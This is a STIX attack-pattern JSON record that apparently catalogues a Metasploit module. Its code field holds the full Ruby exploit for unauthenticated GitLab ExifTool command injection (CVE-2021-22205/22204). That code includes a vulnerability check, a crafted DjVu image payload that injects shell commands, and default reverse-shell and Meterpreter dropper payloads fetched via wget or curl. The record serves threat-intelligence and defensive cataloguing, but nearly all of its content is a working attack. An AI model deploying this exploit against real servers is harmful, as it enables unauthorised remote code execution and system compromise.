{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f35f5e75-dc96-4a67-a1f0-e9491e469169",
    "created": "2024-08-14T17:10:18.013213Z",
    "modified": "2024-08-14T17:10:18.013217Z",
    "name": "GitLab Unauthenticated Remote ExifTool Command Injection",
    "description": " This module exploits an unauthenticated file upload and command injection vulnerability in GitLab Community Edition (CE) and Enterprise Edition (EE). The patched versions are 13.10.3, 13.9.6 and 13.8.8.  Exploitation will result in command execution as the git user.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/gitlab_exif_rce.rb",
            "external_id": "gitlab_exif_rce.rb"
        },
        {
            "source_name": "WilliamBowling",
            "external_id": "#VulnerabilitydiscoveryandCVE-2021-22204PoC"
        },
        {
            "source_name": "reference",
            "url": "https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/"
        },
        {
            "source_name": "reference",
            "url": "https://hackerone.com/reports/1154542"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/D41jRUXCiJ/cve-2021-22205/rapid7-analysis"
        },
        {
            "source_name": "reference",
            "url": "https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'GitLab Unauthenticated Remote ExifTool Command Injection',\n        'Description' => %q{\n          This module exploits an unauthenticated file upload and command\n          injection vulnerability in GitLab Community Edition (CE) and\n          Enterprise Edition (EE). The patched versions are 13.10.3, 13.9.6,\n          and 13.8.8.\n\n          Exploitation will result in command execution as the git user.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'William Bowling',  # Vulnerability discovery and CVE-2021-22204 PoC\n          'jbaines-r7'        # Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2021-22205' ], # GitLab\n          [ 'CVE', '2021-22204' ], # ExifTool\n          [ 'URL', 'https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/' ],\n          [ 'URL', 'https://hackerone.com/reports/1154542' ],\n          [ 'URL', 'https://attackerkb.com/topics/D41jRUXCiJ/cve-2021-22205/rapid7-analysis' ],\n          [ 'URL', 'https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/' ]\n        ],\n        'DisclosureDate' => '2021-04-14',\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'Payload' => {\n                'Space' => 290,\n                'DisableNops' => true,\n                'BadChars' => '#'\n              },\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_openssl'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => [ 'wget', 'lwprequest', 'curl', 'printf' ],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 1,\n        'DefaultOptions' => {\n          'MeterpreterTryToFork' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def upload_file(file_data, timeout = 20)\n    random_filename = \"#{rand_text_alphanumeric(6..12)}.jpg\"\n    multipart_form = Rex::MIME::Message.new\n    multipart_form.add_part(\n      file_data,\n      'image/jpeg',\n      'binary',\n      \"form-data; name=\\\"file\\\"; filename=\\\"#{random_filename}\\\"\"\n    )\n\n    random_uri = normalize_uri(target_uri.path, rand_text_alphanumeric(6..12))\n    print_status(\"Uploading #{random_filename} to #{random_uri}\")\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => random_uri,\n      'ctype' => \"multipart/form-data; boundary=#{multipart_form.bound}\",\n      'data' => multipart_form.to_s\n    }, timeout)\n  end\n\n  def check\n    # Checks if the instance is a GitLab install by looking for the\n    # 'About GitLab' footer or a password redirect. If that's successful\n    # a bogus jpg image is uploaded to a bogus URI. The patched versions\n    # should never send the bad image to ExifTool, resulting in a 404.\n    # The unpatched versions should feed the image to the vulnerable\n    # ExifTool, resulting in a 422 error message.\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/users/sign_in')\n    })\n\n    unless res\n      return CheckCode::Unknown('Target did not respond to check.')\n    end\n\n    # handle two cases. First a normal install will respond with HTTP 200.\n    # Second, if the root password hasn't been set yet then this will\n    # redirect to the password reset page.\n    unless (res.code == 200 && res.body.include?('>About GitLab<')) ||\n           (res.code == 302 && res.body.include?('/users/password/edit?reset_password_token'))\n      return CheckCode::Safe('Not a GitLab web interface')\n    end\n\n    res = upload_file(rand_text_alphanumeric(6..32))\n    unless res\n      return CheckCode::Detected('The target did not respond to the upload request.')\n    end\n\n    case res.code\n    when 422\n      if res.body.include?('The change you requested was rejected.')\n        return CheckCode::Vulnerable('The error response indicates ExifTool was executed.')\n      end\n    when 404\n      if res.body.include?('The page could not be found')\n        return CheckCode::Safe('The error response indicates ExifTool was not run.')\n      end\n    end\n\n    return CheckCode::Detected\n  end\n\n  def execute_command(cmd, _opts = {})\n    # printf needs all '\\' to be double escaped due to ExifTool parsing\n    if cmd.start_with?('printf ')\n      cmd = cmd.gsub('\\\\', '\\\\\\\\\\\\')\n    end\n\n    # header and trailer are taken from William Bowling's echo_vakzz.jpg from their original h1 disclosure.\n    # The 'cmd' variable is sandwiched in a qx## function.\n    payload_header = \"AT&TFORM\\x00\\x00\\x03\\xAFDJVMDIRM\\x00\\x00\\x00.\\x81\\x00\\x02\\x00\\x00\\x00F\\x00\\x00\"\\\n      \"\\x00\\xAC\\xFF\\xFF\\xDE\\xBF\\x99 !\\xC8\\x91N\\xEB\\f\\a\\x1F\\xD2\\xDA\\x88\\xE8k\\xE6D\\x0F,q\\x02\\xEEI\\xD3n\"\\\n      \"\\x95\\xBD\\xA2\\xC3\\\"?FORM\\x00\\x00\\x00^DJVUINFO\\x00\\x00\\x00\\n\\x00\\b\\x00\\b\\x18\\x00d\\x00\\x16\\x00IN\"\\\n      \"CL\\x00\\x00\\x00\\x0Fshared_anno.iff\\x00BG44\\x00\\x00\\x00\\x11\\x00J\\x01\\x02\\x00\\b\\x00\\b\\x8A\\xE6\\xE1\"\\\n      \"\\xB17\\xD9\\x7F*\\x89\\x00BG44\\x00\\x00\\x00\\x04\\x01\\x0F\\xF9\\x9FBG44\\x00\\x00\\x00\\x02\\x02\\nFORM\\x00\\x00\"\\\n      \"\\x03\\aDJVIANTa\\x00\\x00\\x01P(metadata\\n\\t(Copyright \\\"\\\\\\n\\\" . qx#\"\n    payload_trailer = \"# . \\\\\\x0a\\\" b \\\") )\" + (' ' * 421)\n\n    res = upload_file(payload_header + cmd + payload_trailer, 5)\n\n    # Successful exploitation can result in no response (connection being held open by a reverse shell)\n    # or, if the command executes immediately, a response with a 422.\n    if res && res.code != 422\n      fail_with(Failure::UnexpectedReply, \"The target replied with HTTP status #{res.code}. No reply was expected.\")\n    end\n\n    print_good('Exploit successfully executed.')\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      # payload is truncated by exiftool after 290 bytes. Because we need to\n      # expand the printf flavor by a potential factor of 2, halve the linemax.\n      execute_cmdstager(linemax: 144)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-04-14",
    "x_mitre_platforms": [
        "linux'"
    ]
}